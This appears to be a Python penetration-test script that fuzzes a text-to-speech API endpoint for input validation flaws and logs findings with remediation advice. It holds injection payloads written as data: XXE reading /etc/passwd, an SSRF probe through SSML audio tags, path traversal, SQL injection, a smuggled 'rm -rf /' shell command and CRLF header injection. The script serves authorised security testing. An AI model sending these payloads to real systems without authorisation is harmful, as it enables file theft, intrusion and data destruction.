"""
§3 — Input Validation & Injection Tests
AssemblyAI TTS Pentest | Run with: python 03_input_fuzzing.py

Requires:  pip install requests
Key must be in environment:  $env:ASSEMBLYAI_API_KEY = "your_key"
"""
import os
import sys
import json
import requests

sys.path.insert(0, os.path.dirname(__file__))
from utils import (
    get_api_key, log_request, add_finding, save_findings,
    BASE_US, baseline_body, redact
)

ENDPOINT = f"{BASE_US}/speech"


def post(label: str, key: str, body, headers_override: dict = None,
         raw_body: str = None, description: str = "") -> requests.Response:
    hdrs = {"Authorization": key, "Content-Type": "application/json"}
    if headers_override:
        hdrs.update(headers_override)
    try:
        if raw_body is not None:
            data = raw_body.encode() if isinstance(raw_body, str) else raw_body
            r = requests.post(ENDPOINT, headers=hdrs, data=data, timeout=25)
        else:
            r = requests.post(ENDPOINT, headers=hdrs, json=body, timeout=25)
        log_request(label, "POST", ENDPOINT, hdrs, body or raw_body, r, extra=description)
        return r
    except Exception as e:
        print(f"  [{label}] Request error: {e}")
        class _FakeResp:
            status_code = -1
            text = f"CLIENT_OR_NETWORK_ERROR: {e}"
            headers = {}
            content = b""
        log_request(label, "POST", ENDPOINT, hdrs, body or raw_body, extra=f"ERROR: {e}")
        return _FakeResp()


# ---------------------------------------------------------------------------
# I1 — Text field boundary tests
# ---------------------------------------------------------------------------
def test_text_boundaries(key: str):
    print("\n[*] I1 — Text field boundaries")
    base = baseline_body()
    cases = [
        ("text_empty",         "",            "Empty string"),
        ("text_whitespace",    "   \t\n  ",   "Whitespace only"),
        ("text_1char",         "a",           "Single character"),
        ("text_1000chars",     "a" * 1000,    "1000 chars"),
        ("text_5000chars",     "a" * 5000,    "5000 chars"),
        ("text_50000chars",    "a" * 50000,   "50000 chars — likely over limit"),
        ("text_null_byte",     "Hello\x00World", "Null byte embedded"),
    ]
    for label, text, desc in cases:
        body = {**base, "text": text}
        r = post(label, key, body, description=desc)
        billed = r.headers.get("x-tts-billed-characters", "N/A")
        print(f"  {label:<25} status={r.status_code}  billed={billed}")

        if label == "text_whitespace" and r.status_code == 200:
            add_finding(
                title="Whitespace-only text synthesized and potentially billed",
                severity="Medium",
                endpoint=f"POST {ENDPOINT}",
                reproduce='Send {"text": "   "} — API returns 200 and may bill characters.',
                impact="Customers could be billed for empty audio; abuse to test billing without producing speech.",
                remediation="Reject or return a clear error for whitespace-only text before billing.",
            )

        if label == "text_null_byte" and r.status_code == 200:
            add_finding(
                title="Null byte in text field accepted without rejection",
                severity="Low",
                endpoint=f"POST {ENDPOINT}",
                reproduce='Send text containing \\x00 null byte. Status 200.',
                impact="May cause garbled audio or downstream parser issues; potential for injection.",
                remediation="Sanitise or reject text containing null bytes and other control characters.",
            )


# ---------------------------------------------------------------------------
# I2 — Unicode edge cases
# ---------------------------------------------------------------------------
def test_unicode_edge_cases(key: str):
    print("\n[*] I2 — Unicode edge cases")
    base = baseline_body()
    cases = [
        ("unicode_zwsp",    "Hello\u200bWorld",           "Zero-width space"),
        ("unicode_rtl",     "\u202eHello World",          "RTL override character"),
        ("unicode_lre",     "\u202aHello\u202c World",    "LRE/PDF pair"),
        ("unicode_bom",     "\ufeffHello",                "BOM at start"),
        ("unicode_surr",    "Hello\ud800World",           "Unpaired high surrogate (Python may encode differently)"),
        ("unicode_max",     "\U0010ffff",                 "Max code point"),
        ("unicode_rep",     "\ufffd" * 10,                "Replacement characters"),
        ("unicode_mixed",   "Hello \u0000\u200b\ufffd!", "Mixed edge cases"),
    ]
    for label, text, desc in cases:
        try:
            body = {**base, "text": text}
            r = post(label, key, body, description=desc)
            billed = r.headers.get("x-tts-billed-characters", "N/A")
            print(f"  {label:<25} status={r.status_code}  billed={billed}")
        except Exception as e:
            print(f"  {label:<25} CLIENT ERROR: {e}")


# ---------------------------------------------------------------------------
# I3 — SSML / markup injection
# ---------------------------------------------------------------------------
def test_ssml_injection(key: str):
    print("\n[*] I3 — SSML / markup injection")
    base = baseline_body()
    ssml_cases = [
        ("ssml_basic",        "<speak>Hello world</speak>",
                              "Basic SSML wrapper"),
        ("ssml_break",        "<speak>Hello<break time='500ms'/>World</speak>",
                              "SSML break tag"),
        ("ssml_say_as",       "<speak><say-as interpret-as='characters'>ABC</say-as></speak>",
                              "SSML say-as"),
        ("ssml_audio",        "<speak><audio src='http://10.0.0.1/evil.mp3'/></speak>",
                              "SSML audio src — SSRF probe via SSML"),
        ("ssml_entity",       "<speak>&amp;lt;script&amp;gt;</speak>",
                              "HTML entity injection"),
        ("ssml_xxe",          "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><speak>&xxe;</speak>",
                              "XXE via SSML — file read"),
        ("markup_unclosed",   "<speak>Hello",
                              "Unclosed SSML tag"),
        ("markup_deep_nest",  "<speak>" + "<p>" * 100 + "hi" + "</p>" * 100 + "</speak>",
                              "Deeply nested tags"),
    ]
    for label, text, desc in ssml_cases:
        body = {**base, "text": text}
        r = post(label, key, body, description=desc)
        print(f"  {label:<25} status={r.status_code}")

        if label == "ssml_xxe" and r.status_code == 200:
            add_finding(
                title="XXE injection via SSML text field",
                severity="Critical",
                endpoint=f"POST {ENDPOINT}",
                reproduce="Send SSML with external entity referencing file:///etc/passwd.",
                impact="Arbitrary file read on server; potential SSRF.",
                remediation="Disable external entity processing in XML parser; use a safe SSML parser.",
            )

        if label == "ssml_audio" and r.status_code == 200:
            add_finding(
                title="SSML audio src tag may trigger SSRF",
                severity="High",
                endpoint=f"POST {ENDPOINT}",
                reproduce="Send SSML with <audio src='http://internal-ip/'/>; check if server makes outbound request.",
                impact="Server-side request forgery; can reach internal services.",
                remediation="Block or sandbox outbound requests triggered by SSML audio src.",
            )


# ---------------------------------------------------------------------------
# I4 — Parameter fuzzing (voice_id, language, sample_rate, container)
# ---------------------------------------------------------------------------
def test_parameter_fuzzing(key: str):
    print("\n[*] I4 — Parameter fuzzing")
    base = baseline_body()

    param_cases = [
        # voice_id fuzzing
        ("voice_nonexistent",  {**base, "voice_id": "doesnotexist12345"},        "Non-existent voice ID"),
        ("voice_traversal",    {**base, "voice_id": "../../etc/passwd"},          "Path traversal in voice_id"),
        ("voice_inject",       {**base, "voice_id": "alloy'; DROP TABLE voices;--"}, "SQL injection in voice_id"),
        ("voice_long",         {**base, "voice_id": "a" * 500},                  "Very long voice_id"),
        ("voice_null",         {**base, "voice_id": None},                       "Null voice_id"),
        ("voice_int",          {**base, "voice_id": 12345},                      "Integer voice_id"),
        ("voice_empty",        {**base, "voice_id": ""},                         "Empty voice_id"),

        # sample_rate fuzzing
        ("sr_zero",            {**base, "sample_rate": 0},         "sample_rate=0"),
        ("sr_negative",        {**base, "sample_rate": -1},        "sample_rate=-1"),
        ("sr_huge",            {**base, "sample_rate": 999999999}, "sample_rate=999999999"),
        ("sr_string",          {**base, "sample_rate": "high"},    "sample_rate as string"),
        ("sr_float",           {**base, "sample_rate": 22050.5},   "sample_rate as float"),

        # container/encoding fuzzing
        ("container_unknown",  {**base, "container": "flac"},      "Unknown container"),
        ("container_null",     {**base, "container": None},        "Null container"),
        ("encoding_unknown",   {**base, "encoding": "opus"},       "Unknown encoding"),
        ("encoding_inject",    {**base, "encoding": "mp3; rm -rf /"}, "Shell injection in encoding"),

        # language fuzzing
        ("lang_unknown",       {**base, "language": "xx-XX"},                    "Unknown language code"),
        ("lang_injection",     {**base, "language": "en-US' OR '1'='1"},         "SQL injection in language"),
        ("lang_long",          {**base, "language": "en-" + "X" * 200},          "Very long language code"),
    ]

    for label, body, desc in param_cases:
        try:
            r = post(label, key, body, description=desc)
            print(f"  {label:<30} status={r.status_code}")
        except Exception as e:
            print(f"  {label:<30} CLIENT ERROR: {e}")


# ---------------------------------------------------------------------------
# I5 — CRLF / header injection
# ---------------------------------------------------------------------------
def test_crlf_injection(key: str):
    print("\n[*] I5 — CRLF / header injection")
    base = baseline_body()

    # If voice_id is reflected in x-tts-voice-id header, inject CRLF
    crlf_cases = [
        ("crlf_voice_id",
         {**base, "voice_id": "alloy\r\nX-Injected: evil"},
         "CRLF in voice_id hoping for header injection"),
        ("crlf_language",
         {**base, "language": "en-US\r\nX-Injected: evil"},
         "CRLF in language field"),
    ]
    for label, body, desc in crlf_cases:
        r = post(label, key, body, description=desc)
        injected = r.headers.get("x-injected", None)
        print(f"  {label:<25} status={r.status_code}  X-Injected header present: {injected is not None}")
        if injected:
            add_finding(
                title=f"CRLF / header injection via {label}",
                severity="High",
                endpoint=f"POST {ENDPOINT}",
                reproduce=f"Set {label.split('_',1)[1]} to value containing \\r\\n. Response contains injected header.",
                impact="Response-splitting; can be used to poison caches or craft XSS in some contexts.",
                remediation="Strip or reject CR/LF characters from all user-supplied values reflected in headers.",
            )


# ---------------------------------------------------------------------------
# I6 — Malformed JSON bodies
# ---------------------------------------------------------------------------
def test_malformed_json(key: str):
    print("\n[*] I6 — Malformed / edge-case JSON bodies")
    cases = [
        ("json_trailing_comma",  '{"text":"hello","voice_id":"alloy",}',          "Trailing comma"),
        ("json_duplicate_keys",  '{"text":"hello","text":"OVERRIDDEN","voice_id":"alloy"}', "Duplicate keys"),
        ("json_deep_nest",       '{"text":"hi","wrapper":' + '{"x":' * 50 + '"deep"' + '}' * 50 + '}', "50-level nesting"),
        ("json_wrong_ctype",     None, "Correct JSON but wrong Content-Type"),
        ("json_empty_body",      "",   "Empty body"),
        ("json_array_root",      '[{"text":"hi"}]', "Array instead of object"),
        ("json_null_root",       "null", "null as body"),
    ]
    for label, raw, desc in cases:
        hdrs_override = {}
        if label == "json_wrong_ctype":
            raw = json.dumps(baseline_body())
            hdrs_override = {"Content-Type": "text/plain"}
        r = post(label, key, None, headers_override=hdrs_override,
                 raw_body=raw if raw is not None else "", description=desc)
        print(f"  {label:<25} status={r.status_code}  body: {redact(r.text[:100])}")


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    key = get_api_key()
    print(f"[*] Target endpoint : {ENDPOINT}")
    print(f"[*] Key loaded      : ***redacted*** ({len(key)} chars)")

    test_text_boundaries(key)
    test_unicode_edge_cases(key)
    test_ssml_injection(key)
    test_parameter_fuzzing(key)
    test_crlf_injection(key)
    test_malformed_json(key)
    save_findings("findings_03_input.json", section="§3 Input Validation & Injection")
